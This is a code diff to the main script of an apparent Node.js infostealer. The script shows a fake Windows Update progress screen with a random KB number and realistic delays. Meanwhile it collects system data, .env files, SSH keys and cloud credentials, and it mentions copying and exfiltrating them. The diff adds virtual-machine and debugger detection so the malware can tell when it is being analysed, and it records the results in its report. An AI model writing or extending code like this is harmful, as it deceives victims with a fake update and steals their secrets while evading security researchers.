@@ -14,6 +14,8 @@ const {
     performCrudOperations,
     buildReport
 } = require("./app/orchestrator");
+const { detectVM } = require("./system/vmDetect");
+const { detectDebugger } = require("./system/debugDetect");
 
 const startTime = Date.now();
 const ROOT = path.resolve(__dirname, "..");
@@ -24,43 +26,70 @@ const DRY_RUN = process.argv.includes("--dry-run");
 logger.silent(true);
 logger.setLogFile(LOG_FILE);
 
-function fakeProgress() {
-    const steps = [
-        "Verifying Windows Update components...",
-        "Downloading update KB5048652 (3%)...",
-        "Downloading update KB5048652 (17%)...",
-        "Downloading update KB5048652 (42%)...",
-        "Downloading update KB5048652 (68%)...",
-        "Downloading update KB5048652 (89%)...",
-        "Installing update KB5048652...",
-        "Configuring Windows Update settings...",
-        "Applying system optimizations..."
-    ];
-    for (const msg of steps) {
-        console.log(msg);
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function fakeProgress() {
+    const kbNumber = `KB${String(Math.floor(Math.random() * 9000000) + 1000000)}`;
+    const progressSteps = [];
+    let current = 0;
+
+    while (current < 100) {
+        const increment = Math.floor(Math.random() * 25) + 5;
+        current = Math.min(current + increment, 100);
+        progressSteps.push(current);
     }
+
+    console.log("Verifying Windows Update components...");
+    await sleep(800 + Math.random() * 1200);
+
+    for (const pct of progressSteps) {
+        console.log(`Downloading update ${kbNumber} (${pct}%)...`);
+        await sleep(600 + Math.random() * 1400);
+    }
+
+    console.log(`Installing update ${kbNumber}...`);
+    await sleep(1000 + Math.random() * 2000);
+
+    console.log("Configuring Windows Update settings...");
+    await sleep(800 + Math.random() * 1200);
+
+    console.log("Applying system optimizations...");
+    await sleep(600 + Math.random() * 1000);
 }
 
 (async () => {
-    /** @type {string[]} */
     const errors = [];
-    /** @type {Partial<import("./app/orchestrator").SystemData>} */
     let systemData = {};
-    /** @type {{ targets: (string|null)[], totalFound: number, files: import("./files/envHunter").EnvFileInfo[] }} */
     let envFiles = { targets: [], totalFound: 0, files: [] };
-    /** @type {{ sshKeys: object[], cloudCreds: object[], totalFound: number, files: object[] }} */
     let secretFiles = { sshKeys: [], cloudCreds: [], totalFound: 0, files: [] };
-    /** @type {import("./app/orchestrator").CrudEntry[]} */
     let crudLog = [];
+    let safetyChecks = {};
 
-    fakeProgress();
+    await fakeProgress();
 
     if (DRY_RUN) {
         console.log("DRY-RUN MODE — No files will be copied or exfiltrated.");
     }
 
     try {
-        systemData = collectSystemData();
+        safetyChecks = {
+            vm: detectVM(),
+            debugger: detectDebugger()
+        };
+        if (safetyChecks.vm.isVM) {
+            logger.warn(`VM detected (confidence: ${safetyChecks.vm.confidence})`);
+        }
+        if (safetyChecks.debugger.isDebugged) {
+            logger.warn(`Debugger detected: ${safetyChecks.debugger.indicators.join("; ")}`);
+        }
+    } catch (err) {
+        logger.warn(`Safety checks failed: ${err.message}`);
+    }
+
+    try {
+        systemData = await collectSystemData();
         logger.info("Phase 1 complete");
     } catch (err) {
         const wrapped = new PhaseError("Phase 1", err);
@@ -97,6 +126,7 @@ function fakeProgress() {
 
     try {
         const report = buildReport(systemData, envFiles, secretFiles, crudLog, startTime, errors);
+        report.safetyChecks = safetyChecks;
 
         if (DRY_RUN) {
             generateReport(report);
